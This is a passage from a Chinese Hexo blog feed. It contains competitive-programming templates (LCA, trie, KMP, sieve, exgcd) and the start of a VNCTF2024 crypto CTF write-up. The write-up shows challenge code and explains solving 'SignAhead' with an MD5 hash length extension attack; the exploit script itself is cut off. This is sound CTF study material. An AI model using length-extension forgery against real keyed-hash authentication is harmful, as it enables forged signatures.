class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=head[u];i;i=edge[i].nxt)&#123;</span><br><span class="line"><span class="type">int</span> v = edge[i].to;</span><br><span class="line"><span class="keyword">if</span>(v==fat)<span class="keyword">continue</span>;</span><br><span class="line">dfs1(v,u);</span><br><span class="line">siz[u] += siz[v];</span><br><span class="line"><span class="keyword">if</span>(siz[v]&gt;maxson)maxson = siz[v],son[u] = v;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> top[N],id[N],idx = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs2</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> topf)</span>&#123;</span><br><span class="line">id[u] = ++idx;</span><br><span class="line">top[u] = topf;</span><br><span class="line"><span class="keyword">if</span>(!son[u])<span class="keyword">return</span> ;</span><br><span class="line">dfs2(son[u],topf);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=head[u];i;i=edge[i].nxt)&#123;</span><br><span class="line"><span class="type">int</span> v = edge[i].to;</span><br><span class="line"><span class="keyword">if</span>(id[v])<span class="keyword">continue</span>;</span><br><span class="line">dfs2(v,v);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">LCA</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span>&#123;</span><br><span class="line"><span class="keyword">while</span>(top[x]!=top[y])&#123;</span><br><span class="line"><span class="keyword">if</span>(dep[top[x]]&lt;dep[top[y]])swap(x,y);</span><br><span class="line">x = fa[top[x]];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(dep[x]&gt;dep[y])swap(x,y);</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> chafen[N];</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> tot = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> fat)</span>&#123;</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=head[u];i;i=edge[i].nxt)&#123; <span class="comment">// essentially, what i record is the edge</span></span><br><span class="line"><span class="type">int</span> v = edge[i].to;</span><br><span class="line"><span class="keyword">if</span>(v==fat)&#123;</span><br><span class="line">x = i;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">dfs(v,u);</span><br><span class="line">chafen[u] += chafen[v];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">tot += min((<span class="type">long</span> <span class="type">long</span>)((<span class="type">long</span> <span class="type">long</span>)edge[x].w1*(<span class="type">long</span> <span class="type">long</span>)(chafen[u])),(<span class="type">long</span> <span class="type">long</span>)(edge[x].w2));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="type">int</span> u,v,w1,w2;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;u&gt;&gt;v&gt;&gt;w1&gt;&gt;w2;</span><br><span class="line">add(u,v,w1,w2);</span><br><span class="line">add(v,u,w1,w2);</span><br><span class="line">&#125;</span><br><span class="line">dfs1(<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">dfs2(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="type">int</span> s = i,t = i+<span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> u = LCA(s,t);</span><br><span class="line">chafen[s]++,chafen[t]++;</span><br><span class="line">chafen[u] -= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">dfs(<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;tot&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="字典树"><a href="#字典树" class="headerlink" title="字典树"></a>字典树</h2><p>用于快速计算对于多个给的模式串<code>t</code> 给定的n个<code>s</code>中有多少个满足以<code>t</code>为前缀<br>就是建了一个多叉树 然后维护父节点的<code>cnt</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">3e6</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> tr[N][<span class="number">65</span>],cnt[N];</span><br><span class="line"><span class="type">int</span> T,n,q;</span><br><span class="line"><span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getnum</span><span class="params">(<span class="type">char</span> ch)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(ch&gt;=<span class="string">&#x27;A&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;Z&#x27;</span>)<span class="keyword">return</span> ch-<span class="string">&#x27;A&#x27;</span>+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(ch&gt;=<span class="string">&#x27;a&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;z&#x27;</span>)<span class="keyword">return</span> ch-<span class="string">&#x27;a&#x27;</span>+<span class="number">1</span>+<span class="number">26</span>;</span><br><span class="line"><span class="keyword">if</span>(ch&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;9&#x27;</span>)<span class="keyword">return</span> ch-<span class="string">&#x27;0&#x27;</span>+<span class="number">1</span>+<span class="number">26</span>+<span class="number">26</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> l = s.<span class="built_in">size</span>();</span><br><span class="line"><span class="type">int</span> p = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;l;i++)&#123;</span><br><span class="line"><span class="type">int</span> c = <span class="built_in">getnum</span>(s[i]);</span><br><span class="line"><span class="keyword">if</span>(!tr[p][c])</span><br><span class="line">tr[p][c] = ++idx;</span><br><span class="line">p = tr[p][c];</span><br><span class="line">cnt[p]++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> l = s.<span class="built_in">size</span>();</span><br><span class="line"><span class="type">int</span> p = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;l;i++)&#123;</span><br><span class="line"><span class="type">int</span> c = <span class="built_in">getnum</span>(s[i]);</span><br><span class="line"><span class="keyword">if</span>(!tr[p][c])<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">p = tr[p][c];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> cnt[p];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">cin&gt;&gt;T;</span><br><span class="line"><span class="keyword">while</span>(T--)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=idx;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">65</span>;j++)</span><br><span class="line">tr[i][j] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=idx;i++)</span><br><span class="line">cnt[i] = <span class="number">0</span>;</span><br><span class="line">idx = <span class="number">0</span>;</span><br><span class="line">cin&gt;&gt;n&gt;&gt;q;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">string s;</span><br><span class="line">cin&gt;&gt;s;</span><br><span class="line"><span class="built_in">insert</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(q--)&#123;</span><br><span class="line">string s;</span><br><span class="line">cin&gt;&gt;s;</span><br><span class="line">cout&lt;&lt;<span class="built_in">query</span>(s)&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="KMP"><a href="#KMP" class="headerlink" title="KMP"></a>KMP</h2><p>字符串类型的题目部分分就靠这个算法了</p><p>求s2在s1中出现的 位置&#x2F;次数<br>复杂度从暴力的<code>O(n*m)</code>优化到<code>O(n+m)</code><br>两次过程很像 注意区别+联系<br><code>f[i]==l2</code>就是匹配的条件 出现的位置就是 <code>i-l2+1</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> nxt[N],f[N];</span><br><span class="line">string s1,s2;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">cin&gt;&gt;s1&gt;&gt;s2;</span><br><span class="line"><span class="type">int</span> l1 = s1.<span class="built_in">size</span>(),l2 = s2.<span class="built_in">size</span>();</span><br><span class="line">s1 = <span class="string">&quot; &quot;</span>+s1,s2 = <span class="string">&quot; &quot;</span>+s2;</span><br><span class="line">nxt[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>,j=<span class="number">0</span>;i&lt;=l2;i++)&#123;</span><br><span class="line"><span class="keyword">while</span>(j&gt;<span class="number">0</span>&amp;&amp;(j==l2||s2[i]!=s2[j+<span class="number">1</span>]))j = nxt[j];</span><br><span class="line"><span class="keyword">if</span>(s2[i]==s2[j+<span class="number">1</span>])j++;</span><br><span class="line">nxt[i] = j;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>,j=<span class="number">0</span>;i&lt;=l1;i++)&#123;</span><br><span class="line"><span class="keyword">while</span>(j&gt;<span class="number">0</span>&amp;&amp;(j==l2||s1[i]!=s2[j+<span class="number">1</span>]))j = nxt[j];</span><br><span class="line"><span class="keyword">if</span>(s1[i]==s2[j+<span class="number">1</span>])j++;</span><br><span class="line">f[i] = j;</span><br><span class="line"><span class="keyword">if</span>(f[i]==l2)</span><br><span class="line">cout&lt;&lt;i-l2+<span class="number">1</span>&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=l2;i++)cout&lt;&lt;nxt[i]&lt;&lt;<span class="string">&quot; &quot;</span>;cout&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="DP-贪心-分治"><a href="#DP-贪心-分治" class="headerlink" title="DP&#x2F;贪心&#x2F;分治"></a>DP&#x2F;贪心&#x2F;分治</h1><h1 id="数论"><a href="#数论" class="headerlink" title="数论"></a>数论</h1><h2 id="线性筛素数"><a href="#线性筛素数" class="headerlink" title="线性筛素数"></a>线性筛素数</h2><p>注意几个地方的优化细节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x&lt;<span class="number">0</span>)<span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>),x = -x;</span><br><span class="line"><span class="keyword">if</span>(x&gt;<span class="number">9</span>)write(x/<span class="number">10</span>);</span><br><span class="line"><span class="built_in">putchar</span>(x%<span class="number">10</span>+<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">bool</span> notp[N];</span><br><span class="line"><span class="type">int</span> prime[N],cntp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">work</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">notp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!notp[i])prime[++cntp] = i;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=cntp;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(prime[j]*i&gt;n)<span class="keyword">break</span>;</span><br><span class="line">notp[prime[j]*i] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(i%prime[j]==<span class="number">0</span> || prime[j]%i==<span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">work(n);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">register</span> <span class="type">int</span> i=<span class="number">1</span>;i&lt;=cntp;i++)&#123;</span><br><span class="line">write(prime[i]);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="扩展欧几里得算法"><a href="#扩展欧几里得算法" class="headerlink" title="扩展欧几里得算法"></a>扩展欧几里得算法</h2><p>exgcd:<br>密码学python套过很多次模板…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> xx = <span class="number">0</span>,yy = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">exgcd</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(b==<span class="number">0</span>)&#123;</span><br><span class="line">xx = <span class="number">1</span>,yy = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> GCD = exgcd(b,a%b);</span><br><span class="line"><span class="type">int</span> tmp = xx;</span><br><span class="line">xx = yy;</span><br><span class="line">yy = tmp-a/b*yy;</span><br><span class="line"><span class="keyword">return</span> GCD;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">to calculate the x satisfy that a*x === 1 mod m</span></span><br><span class="line"><span class="comment">we just change the equivalent to this form:</span></span><br><span class="line"><span class="comment">ax + b*m == 1</span></span><br><span class="line"><span class="comment">so we use exgcd(a,m) =&gt; x,b</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="type">int</span> a,m;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a&gt;&gt;m;</span><br><span class="line"><span class="type">int</span> gcd = exgcd(a,m);</span><br><span class="line"><span class="keyword">while</span>(xx&lt;<span class="number">0</span>)</span><br><span class="line">xx += m;</span><br><span class="line">yy = (<span class="number">1</span>-a*xx)/m;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;xx&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;yy&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>密码学脚本</title>
      <link href="/%E5%AF%86%E7%A0%81%E5%AD%A6%E8%84%9A%E6%9C%AC/"/>
      <url>/%E5%AF%86%E7%A0%81%E5%AD%A6%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="52daee762ea199373dc069cdb34ccd818735f54bfa4c1740e519dc4da6c1c0e4"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Crypto-Other-2</title>
      <link href="/Crypto-Other-2/"/>
      <url>/Crypto-Other-2/</url>
      
        <content type="html"><![CDATA[<p>记录CTF的密码题</p><span id="more"></span><h1 id="VNCTF2024"><a href="#VNCTF2024" class="headerlink" title="VNCTF2024"></a>VNCTF2024</h1><p>赛时没打 赛后复现 参考 <a href="https://dexterjie.github.io/2024/02/20/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/VNCTF2024/#basiccry">VNCTF2024 </a></p><h2 id="basiccry"><a href="#basiccry" class="headerlink" title="basiccry"></a>basiccry</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;********************************&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">rr = matrix(ZZ,[random_vector(ZZ,<span class="number">256</span>,<span class="number">0</span>,<span class="number">2</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)])</span><br><span class="line">mm = matrix(GF(<span class="number">2</span>),[<span class="built_in">list</span>(<span class="built_in">bin</span>(m)[<span class="number">2</span>:].rjust(<span class="number">256</span>,<span class="string">&#x27;0&#x27;</span>))]*<span class="number">256</span>)</span><br><span class="line">cc = mm+rr</span><br><span class="line">ii = vector(ZZ,<span class="built_in">input</span>(<span class="string">&quot;Undoubtedly, this is a backdoor left for you: &quot;</span>).split(<span class="string">&quot;,&quot;</span>))</span><br><span class="line">dd = rr*ii</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cc)</span><br><span class="line"><span class="built_in">print</span>(dd)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很简单的交互题 两种思路</p><h3 id="Sol-1"><a href="#Sol-1" class="headerlink" title="Sol.1"></a>Sol.1</h3><p>我们构造形如 <code>(1,0,0,0,...,0) (0,1,0,...,0)</code> 这种<code>ii</code> 256次就可以全部泄露出<code>rr</code> 然后反解<code>mm</code>即可</p><h3 id="Sol-2"><a href="#Sol-2" class="headerlink" title="Sol.2"></a>Sol.2</h3><p>注意到是<code>0-1</code>序列 我们可以构造背包密码系统 自己选一个超递增序列作为<code>ii</code> 得到密文后反解明文即可</p><h2 id="SignAhead"><a href="#SignAhead" class="headerlink" title="SignAhead"></a>SignAhead</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> token_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ROUNDS = <span class="number">100</span></span><br><span class="line"></span><br><span class="line">successful_forge = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ROUNDS):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Round <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    key = token_bytes(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    msg = token_bytes(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    sign = md5(key + msg).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;msg:&#x27;</span>, msg.<span class="built_in">hex</span>())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;sign:&#x27;</span>, sign)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;FORGE ME!!!!&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    newmsg = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&#x27;msg: &#x27;</span>))</span><br><span class="line">    newsign = <span class="built_in">input</span>(<span class="string">&#x27;sign: &#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> msg != newmsg</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> md5(key + newmsg).hexdigest() == newsign:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;GREAT JOB&#x27;</span>)</span><br><span class="line">        successful_forge += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;you failed!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> successful_forge == ROUNDS:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Here is your reward:&#x27;</span>, flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;try harder next time !&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>考察点是<code>md5哈希长度扩展攻击</code></p><p>只要我们知道<code>msg</code> , <code>key</code>的长度和<code>md5(msg+key)</code>就可以进行攻击</p><p>exp: (照抄)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 